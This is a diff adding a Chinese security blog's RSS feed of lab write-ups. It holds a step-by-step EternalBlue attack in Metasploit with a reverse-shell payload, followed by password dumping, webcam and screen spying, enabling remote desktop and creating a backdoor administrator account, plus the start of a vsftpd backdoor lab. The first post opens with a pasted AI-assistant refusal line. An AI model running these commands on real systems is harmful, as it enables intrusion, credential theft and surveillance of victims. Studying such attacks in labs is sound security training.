@@ -1,0 +1,677 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞复现 on SoulJian小站</title><link>https://souljian.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><description>Recent content in 漏洞复现 on SoulJian小站</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 21 Apr 2025 21:20:47 +0800</lastBuildDate><atom:link href="https://souljian.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>永恒之蓝漏洞复现</title><link>https://souljian.cn/p/745241647/</link><pubDate>Mon, 21 Apr 2025 21:20:47 +0800</pubDate><guid>https://souljian.cn/p/745241647/</guid><description>&lt;p>很抱歉，我无法直接生成图片，但我可以为你提供一份详细的笔记，包括命令解释和说明。你可以根据这些内容自行绘制相关流程图或示意图。&lt;/p>
+&lt;hr>
+&lt;h3 id="一什么是永恒之蓝">（一）什么是永恒之蓝？
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>定义&lt;/strong>：永恒之蓝（Eternal Blue）是一种利用 Windows 系统 SMB 协议漏洞（通常使用 139、445 端口）的攻击方式，攻击者通过该漏洞可获取系统最高权限，进而控制被入侵计算机。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>影响范围&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>2017 年 5 月 12 日，不法分子改造&amp;quot;永恒之蓝&amp;quot;制作了 WannaCry 勒索病毒，导致全球范围内大量机构（包括学校、大型企业和政府机构）遭受攻击。&lt;/li>
+&lt;li>被攻击设备被锁定，要求支付 300 美元比特币赎金，否则删除文件。&lt;/li>
+&lt;li>攻击通过扫描开放 445 端口的 Windows 机器，无需用户操作，开机上网即可被植入勒索软件、远程控制木马等恶意程序。&lt;/li>
+&lt;li>受影响国家包括乌克兰、俄罗斯、西班牙、法国、英国等，重要基础设施（政府、银行、电力系统等）均被波及。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二受影响的系统版本">（二）受影响的系统版本
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>桌面操作系统&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Windows XP&lt;/li>
+&lt;li>Windows Vista&lt;/li>
+&lt;li>Windows 7&lt;/li>
+&lt;li>Windows 8&lt;/li>
+&lt;li>Windows 8.1&lt;/li>
+&lt;li>Windows 10&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>服务器操作系统&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Windows Server 2000&lt;/li>
+&lt;li>Windows Server 2003&lt;/li>
+&lt;li>Windows Server 2008&lt;/li>
+&lt;li>Windows Server 2012&lt;/li>
+&lt;li>Windows Server 2016&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>备注&lt;/strong>：是否受影响取决于是否安装了对应的补丁。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="二永恒之蓝攻击步骤">二、永恒之蓝攻击步骤
+&lt;/h2>&lt;h3 id="一内网扫描存活机器">（一）内网扫描存活机器
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS -p &lt;span class="m">445&lt;/span> 192.168.110.0/24 &amp;gt; p_445
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>使用 &lt;code>nmap&lt;/code> 工具进行半开放扫描（&lt;code>-sS&lt;/code>），扫描指定网段（&lt;code>192.168.110.0/24&lt;/code>）内开放 445 端口的主机。&lt;/li>
+&lt;li>扫描结果保存到文件 &lt;code>p_445&lt;/code> 中。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>目的&lt;/strong>：找出内网中可能存在的目标主机。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二确定攻击目标">（二）确定攻击目标
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>操作&lt;/strong>：筛选出开放 445 端口的存活机器，确定攻击目标。&lt;/li>
+&lt;/ul>
+&lt;h3 id="三测试目标连通性">（三）测试目标连通性
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ping &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 &lt;code>ping&lt;/code> 命令测试目标主机的网络连通性，确保目标主机可达。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四打开-kali-数据库">（四）打开 Kali 数据库
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">service postgresql status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql start
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql status
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>查看 PostgreSQL 数据库服务的状态。&lt;/li>
+&lt;li>如果未开启，则启动数据库服务。&lt;/li>
+&lt;li>再次确认数据库服务已成功启动。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="五数据库初始化">（五）数据库初始化
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfdb init
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：初始化 Metasploit 框架的数据库，为后续攻击做准备。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="六启动-msf-工具">（六）启动 msf 工具
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：启动 Metasploit 框架的控制台。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="七搜索永恒之蓝漏洞">（七）搜索永恒之蓝漏洞
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search ms17_010
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：在 Metasploit 框架中搜索与 MS17-010 漏洞相关的模块。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="八选择扫描模块">（八）选择扫描模块
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/smb/smb_ms17_010
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>auxiliary/scanner/smb/smb_ms17_010&lt;/code>：用于扫描目标主机是否存在 MS17-010 漏洞（Proof of Concept，PoC 扫描）。&lt;/li>
+&lt;li>&lt;code>exploit/windows/smb/ms17_010_eternalblue&lt;/code>：用于实际利用 MS17-010 漏洞的攻击模块。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="九设置扫描基本配置">（九）设置扫描基本配置
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> rhost &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lhost &lt;span class="o">[&lt;/span>攻击机IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>rhost&lt;/code>：设置目标主机的 IP 地址。&lt;/li>
+&lt;li>&lt;code>payload&lt;/code>：设置攻击载荷，这里使用的是 &lt;code>windows/x64/meterpreter/reverse_tcp&lt;/code>，即 64 位 Windows 系统的 Meterpreter 反向 TCP 连接。&lt;/li>
+&lt;li>&lt;code>lhost&lt;/code>：设置攻击机的 IP 地址，用于接收目标主机的 Meterpreter 连接。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十开始攻击">（十）开始攻击
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exploit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：执行攻击，利用 MS17-010 漏洞入侵目标主机。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十一攻击生效">（十一）攻击生效
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>操作&lt;/strong>：攻击成功后，可进行以下操作：&lt;/p>
+&lt;ul>
+&lt;li>文件上传下载&lt;/li>
+&lt;li>获取截屏&lt;/li>
+&lt;li>获取密码&lt;/li>
+&lt;li>开启摄像头&lt;/li>
+&lt;li>后门持久化等&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="三漏洞利用">三、漏洞利用
+&lt;/h2>&lt;h3 id="一截屏">（一）截屏
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">screenshot
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>screenshot&lt;/code> 命令获取目标主机的屏幕截图，截图保存在攻击机的 &lt;code>/home/mz/&lt;/code> 目录下。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二获取账号密码">（二）获取账号密码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashdump
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">load kiwi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ps -S &lt;span class="s2">&amp;#34;csrss&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">migrate &lt;span class="o">[&lt;/span>进程号&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">creds_all
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>hashdump&lt;/code>：获取目标主机的用户名及加密密码。&lt;/li>
+&lt;li>&lt;code>load kiwi&lt;/code>：加载 Kiwi 模块，用于获取更详细的凭证信息。&lt;/li>
+&lt;li>&lt;code>ps -S &amp;quot;csrss&amp;quot;&lt;/code>：搜索 &lt;code>csrss.exe&lt;/code> 进程，获取其进程号。&lt;/li>
+&lt;li>&lt;code>migrate [进程号]&lt;/code>：将 Meterpreter 迁移到指定进程，获取更高的权限（如 SYSTEM 权限）。&lt;/li>
+&lt;li>&lt;code>creds_all&lt;/code>：获取目标主机的所有凭证信息，包括解析加密密码。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="三实时监控">（三）实时监控
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run vnc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">screenshare
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>run vnc&lt;/code>：启动 VNC 服务，用于远程桌面监控。&lt;/li>
+&lt;li>&lt;code>screenshare&lt;/code>：共享屏幕，实时查看目标主机的屏幕操作。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四开启摄像头">（四）开启摄像头
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">webcam_stream
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>webcam_stream&lt;/code> 命令开启目标主机的摄像头，实时监控。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="四后渗透阶段">四、后渗透阶段
+&lt;/h2>&lt;h3 id="一shell-连接目标机器">（一）Shell 连接目标机器
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>shell&lt;/code> 命令获取目标主机的命令行交互界面。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二消除乱码">（二）消除乱码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chcp &lt;span class="m">65001&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：在目标主机上设置字符编码为 UTF-8，避免乱码问题。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="三开启目标远程桌面服务">（三）开启目标远程桌面服务
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wmic RDTOGGLE WHERE &lt;span class="nv">ServerName&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Windows Management Instrumentation Command-line（WMIC）工具开启目标主机的远程桌面服务（默认端口 3389）。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四查看端口开启状态">（四）查看端口开启状态
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netstat -an
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：查看目标主机的网络连接状态，确认远程桌面服务端口（3389）是否已开启。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="五远程桌面连接">（五）远程桌面连接
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rdesktop &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：使用 &lt;code>rdesktop&lt;/code> 工具连接目标主机的远程桌面服务。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="六登录账号密码">（六）登录账号密码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>操作&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>如果目标主机已有账号密码，直接使用。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>如果没有，可通过以下命令新建用户并提升为管理员：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>创建用户&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net user hack &lt;span class="m">123456&lt;/span> /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>提升为管理员&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net localgroup administrators hack /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="图形化建议">图形化建议
+&lt;/h2>&lt;p>你可以根据上述内容绘制以下流程图：&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>攻击流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>内网扫描存活机器 → 确定攻击目标 → 测试目标连通性 → 打开 Kali 数据库 → 数据库初始化 → 启动 msf 工具 → 搜索漏洞 → 选择扫描模块 → 设置扫描配置 → 开始攻击 → 攻击生效。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>漏洞利用流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>截屏 → 获取账号密码 → 实时监控 → 开启摄像头。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>后渗透阶段流程图&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Shell 连接目标机器 → 消除乱码 → 开启远程桌面服务 → 查看端口状态 → 远程桌面连接 → 登录账号密码。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>FTP笑脸漏洞复现</title><link>https://souljian.cn/p/745211567/</link><pubDate>Mon, 21 Apr 2025 12:59:27 +0800</pubDate><guid>https://souljian.cn/p/745211567/</guid><description>&lt;p>&lt;strong>实验笔记：vsftpd 2.3.4 笑脸漏洞复现&lt;/strong>&lt;/p>
+&lt;h2 id="实验目标">&lt;strong>实验目标&lt;/strong>
+&lt;/h2>&lt;p>复现 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，通过该漏洞获取靶机的 root 权限。&lt;/p>
+&lt;h2 id="实验环境">&lt;strong>实验环境&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>攻击机&lt;/strong>：Kali Linux&lt;/li>
+&lt;li>&lt;strong>靶机&lt;/strong>：Metasploitable Linux 2.0.0&lt;/li>
+&lt;/ul>
+&lt;h2 id="实验步骤">&lt;strong>实验步骤&lt;/strong>
+&lt;/h2>&lt;h3 id="一环境搭建">&lt;strong>一、环境搭建&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>下载并启动靶机&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>下载 Metasploitable Linux 2.0.0 镜像文件。&lt;/li>
+&lt;li>解压后使用 VMware 打开并启动虚拟机。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>登录靶机并修改 root 密码&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用普通用户 &lt;code>msfadmin&lt;/code> 登录，密码为 &lt;code>msfadmin&lt;/code>。&lt;/p>
